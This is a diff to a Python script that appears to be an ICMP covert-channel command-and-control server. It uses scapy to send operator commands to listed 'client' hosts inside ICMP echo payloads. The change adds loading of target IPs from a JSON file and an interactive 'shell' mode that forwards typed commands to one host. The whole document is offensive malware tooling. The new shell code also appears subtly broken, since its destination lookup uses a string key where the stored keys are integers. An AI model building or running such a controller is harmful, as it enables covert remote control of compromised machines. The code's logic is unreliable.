@@ -12,6 +12,8 @@ def print_help():
     print("\tremoveallclients         Removes all clients")
     print("\tsend <ID> <message>      Send message to client at ID")
     print("\tsendtoall <message>      Sends <message> to all clients")
+    print("\tloadclients              Loads all clients specified in JSONFILE")
+    print("\tshell <ID>               Creates a direct line with client at ID")
     print("\tkill                     Stops server")
     print("\thelp                     Prints this")
 
@@ -24,6 +26,7 @@ def addclient(clients, arguments, id):
 
 def json_add_client(ip, clients, id):
     clients[id] = ip
+    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}")
     id += 1
     return id
 
@@ -45,7 +48,7 @@ def removeallclients(clients):
     clients.clear()
     if DEBUG: print(f"[DEBUG] All clients removed")
 
-# Send command to client by ID via ICMP data
+# Send command to client by ID via ICMP data, max of 1472 data bytes
 def send_command(arguments, clients):
     try:
         clientcommand = arguments[1] 
@@ -59,12 +62,24 @@ def send_command(arguments, clients):
     except:
         print("[ERROR] Usage: send <ID> <message>")
 
+# Send command to all clients
 def sendtoall(arguments, clients):
     for client in clients:
         evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
         if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
         send(evil)
 
+def shell(clients, arguments):
+    print("Type \"kill\" to exit")
+    while(True):
+        command = input(f"{clients.get(int(arguments[1]))} >> ")
+        if command == "kill":
+            break
+        evil = IP(dst=clients.get(clients.get(arguments[1])))/ICMP(type=8)/(command)
+        if DEBUG: print(f"[DEBUG] \"{command}\" sent to {arguments[1]} at {clients.get(int(arguments[1]))}")
+        send(evil)
+
+# Checks if an IP is valid
 def valid_IP(arguments):
     a = arguments[1].split('.')
     if len(a) != 4:
@@ -77,6 +92,7 @@ def valid_IP(arguments):
             return False
     return True
 
+# Create clients based on JSON file
 def generate_targets(JSONFILE, clients, id):
     f = open(JSONFILE, 'r')
     data = json.loads(f.read())
@@ -112,8 +128,10 @@ def main():
             send_command(arguments, clients)
         elif arguments[0] == "sendtoall":
             sendtoall(arguments, clients)
-        elif arguments[0] == "test":
+        elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
+        elif arguments[0] == "shell":
+            shell(clients, arguments)
         elif arguments[0] == "kill":
             break
         elif arguments[0] == "help":
